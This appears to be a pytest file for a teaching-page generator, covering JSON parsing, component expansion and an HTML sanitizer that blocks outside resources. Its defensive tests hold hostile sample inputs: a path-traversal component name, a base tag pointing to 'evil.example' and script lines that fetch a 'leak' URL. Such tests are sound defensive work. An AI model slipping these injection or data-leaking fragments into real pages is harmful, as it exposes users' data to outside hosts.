import json
import html
import pytest
from teach_agent.materials import Materials
from teach_agent.model import parse_json
from teach_agent.artifacts import assemble_page


def test_only_json_objects_are_accepted():
    assert parse_json('```json\n{"title":"力"}\n```')['title'] == '力'
    for response in ['[]', '{bad}', '解释文字 {"title":"力"}', 'null']:
        with pytest.raises(ValueError):
            parse_json(response)


def test_all_subjects_available_and_selected_component_embedded():
    m = Materials()
    assert len(m.catalog()) == 213
    page = m.expand('<main>{{component:chem.labware.burette.basic}}</main>', ['chem.labware.burette.basic'])
    assert 'data-teach-component="chem.labware.burette.basic"' in page
    assert '{{component:' not in page
    with pytest.raises(ValueError):
        m.expand('{{component:../../config}}', [])


def test_math_bundle_contains_local_fonts_and_chemical_renderer():
    m = Materials()
    page = m.expand('<html><head><!--TEACH_MATH--></head><body></body></html>', [])
    assert 'data:font/woff2;base64,' in page
    assert 'fonts/KaTeX' not in page
    assert '<!--TEACH_MATH-->' not in page
    assert len(page) > 300000


@pytest.mark.parametrize('fragment', [
    '<script src="https://cdn.example/x.js"></script>',
    '<img src="file:///C:/secret.png">',
    '<iframe src="http://localhost:8080"></iframe>',
    '<base href="http://evil.example">',
    '<style>body{background:url(https://example.org/x.png)}</style>',
    '<a href="https://example.org">link</a>',
    '<meta http-equiv="refresh" content="0;url=http://example.org">',
])
def test_external_and_privileged_resources_rejected(fragment):
    with pytest.raises(ValueError):
        assemble_page('<!doctype html><html><head></head><body>'+fragment+'</body></html>')


def test_safe_page_gets_network_blocking_policy():
    page = assemble_page('<!doctype html><html><head></head><body><button>试试</button></body></html>')
    assert "connect-src 'none'" in html.unescape(page)
    assert 'Content-Security-Policy' in page


@pytest.mark.parametrize('prefix',[
    '<!-- <html><head></head></html> -->',
    '<script>fetch("https://example.invalid/leak")</script>',
    '<!-->',
])
def test_ambiguous_prefix_cannot_bypass_content_policy(prefix):
    with pytest.raises(ValueError):
        assemble_page(prefix+'<html><head></head><body>test</body></html>')


def test_executable_content_cannot_precede_head():
    with pytest.raises(ValueError):
        assemble_page('<html><script>fetch("https://example.invalid/leak")</script><head></head><body>x</body></html>')
